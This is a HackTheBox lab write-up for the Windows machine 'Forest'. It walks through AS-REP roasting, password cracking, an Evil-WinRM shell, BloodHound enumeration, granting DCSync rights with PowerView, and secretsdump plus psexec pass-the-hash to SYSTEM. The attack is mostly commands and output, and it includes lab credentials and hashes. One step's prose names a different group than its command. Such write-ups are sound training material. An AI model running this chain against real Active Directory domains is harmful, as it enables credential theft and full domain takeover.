---
title: Forest Writeup
author: ak3dv
date: 2023-02-17
categories: [Writeup, HTB]
tags: [Windows, AD, DCSync, ASREPRoast]
image:
  path: ../../assets/img/commons/Forest/forest.png
  width: 700
  height: 900
  alt: Banner Forest
---

We are going to solve an easy Windows machine from Hackthebox called Forest.

## Exploitation Guide for Forest

### Enumeration

```bash
# Nmap 7.93 scan initiated Fri Feb 17 14:18:33 2023 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706 -n -v -sCV -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.052s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-17 13:25:29Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-17T05:26:19-08:00
| smb2-time: 
|   date: 2023-02-17T13:26:20
|_  start_date: 2023-02-17T13:21:42
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h46m49s, deviation: 4h37m08s, median: 6m49s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 17 14:19:39 2023 -- 1 IP address (1 host up) scanned in 66.89 seconds
```

Within the nmap results we notice a domain `htb.local`.
We can add it in the `/etc/hosts` file.

```bash
 echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

### DNS Enumeration

Enumerating through the DNS, we see a new subdomain `forest.htb.local` (again, we add it in the `/etc/hosts` file),

```bash
dig ANY @10.10.10.161 htb.local

; <<>> DiG 9.18.8-1-Debian <<>> ANY @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49877
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 092f9108c9376177 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	ANY

;; ANSWER SECTION:
htb.local.		600	IN	A	10.10.10.161
htb.local.		3600	IN	NS	forest.htb.local.
htb.local.		3600	IN	SOA	forest.htb.local. hostmaster.htb.local. 104 900 600 86400 3600

;; ADDITIONAL SECTION:
forest.htb.local.	3600	IN	A	10.10.10.161

;; Query time: 51 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (TCP)
;; WHEN: Fri Feb 17 14:30:52 CET 2023
;; MSG SIZE  rcvd: 150
```

### RPC Enumeration

As an anonymous user, we can connect via RPC and check if we have permissions to enumerate the domain.

As we can see we are able to obtain info as an anonymous user.

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
......
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

### ASREPRoast Attack

Knowing all domain users, we can check if someone has kerberos pre authentication disabled.

And we observe that the `svc-alfresco` account doesn't have kerberos pre authentication enabled.

```bash
impacket-GetNPUsers htb.local/ -usersfile users -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User forest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:42e773bee9501251da0035229b24c84d$7cec2490ed175e7d69bf4e7e65df1c39c6f0e24e4fc4d9b241cf8dc120ec418c5bce64f84ca80a544b92d9bb27dc620a6d1b96c68e3c97f1a9d910cc223e4993b7cc9483eefc01434dd48533cc0eec9f0b4a0320dadaa55546e56fc77c2ddd5f9e5f19cf554b0a56b3cdfb00f5043699ec34cc3e80f1ca42f1989855c2cdaa6239a2dcc98b8fea550820c8838592c8fdaecdd80636dc7bc0e800348c2cd4417b82c90719004124a1c72c4119133590d16910907b7bce63befa766831eb040eae7e5853793a36593c005de9d502374201ed32de3978ca3b62092fbbef9d41799651bd93db6220
```

**In this case anyone can send an AS_REQ request to the DC on behalf of svc-alfresco, and receive an AS_REP message. Since part of that message is encrypted using the user’s password, we can attempt to brute-force the user’s password offline.**

Using `Impacket-GetNPUsers` we can request the `Kerberos 5, etype 23, AS-REP` hash of the `svc-alfresco` account and crack it with john.

`svc-alfresco`:`s3rvice`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:03 DONE (2023-02-17 14:55) 0.3012g/s 1230Kp/s 1230Kc/s 1230KC/s s4ls469..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### WinRM 

Using the above credentials, we can get a shell as `svc-alfresco` through the `WinRM` service.

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

### Bloodhound Enumeration

Now we can upload `SharpHound` to extract all the info from the domain.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
Info: Uploading SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe -c all
2023-02-17T06:22:37.2522257-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
.......
2023-02-17T06:23:25.1743400-08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-02-17T06:23:25.1901874-08:00|INFORMATION|SharpHound Enumeration Completed at 6:23 AM on 2/17/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/17/2023   6:23 AM          18989 20230217062324_BloodHound.zip
```

Once the data is loaded into bloodhound we can check that the `svc-alfresco` account is part of the `Account Operators` group.

![bloodhound](/assets/img/commons/Forest/bloodhound.png)

#### Account Operators

Being in this group allows:

- Creating non administrator accounts and groups on the domain.
- Logging in to the DC locally.

Knowing this and also that the `Exchange Windows permissions` group has permissions to modify the DACL (Discretionary Access Control List) we can add a user to this group and then grant this user with DCSync privileges.

![Exchange](/assets/img/commons/Forest/exchange.png)

Add `svc-alfresco` to the `Exchange Windows permissions` group.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Trusted Subsystem" svc-alfresco /add /domain
The command completed successfully.
```

#### Grant DCSync privileges.

**DCSync attacks allow an attacker to impersonate a domain controller and request password hashes from other domain controllers.**

First, we need to upload and import `powerview`.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload Powerview.ps1
Info: Uploading Powerview.ps1 to C:\Users\svc-alfresco\Documents\Powerview.ps1
                                                             
Data: 1027040 bytes of 1027040 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\Powerview.ps1
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "htb.local\Domain Admins" -Rights DCSync
```

### NTDS.dit

After granting DCSync permissions to `svc-alfresco`, with `secretsdump` we can dump the `ntds.dit` and grab the Domain Administrator Hash `32693b11e6aa90eb43d32c72a07ceea6`.

```bash
impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
.....................................
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
pwned:aes256-cts-hmac-sha1-96:0cd1909efab8f76c61733f94112be8b54260e86045cbc443b0b6a52c9acb5a74
pwned:aes128-cts-hmac-sha1-96:f333bc507e53dba672c153e5497472db
pwned:des-cbc-md5:3b972a20abbaa2e9
FOREST$:aes256-cts-hmac-sha1-96:963efea807f0207eacf921925c3fb0a56ccbcecb6635f326c4af2e0e42cd57eb
FOREST$:aes128-cts-hmac-sha1-96:8e6d8cc3b35e2e48382f8d486e82c3c4
FOREST$:des-cbc-md5:8a202ca789343d02
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

And with the `administrator` hash we can use `psexec` to get a shell as `nt authority\system`.

```bash
impacket-psexec administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file vrWEKDTR.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service AzEB on 10.10.10.161.....
[*] Starting service AzEB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```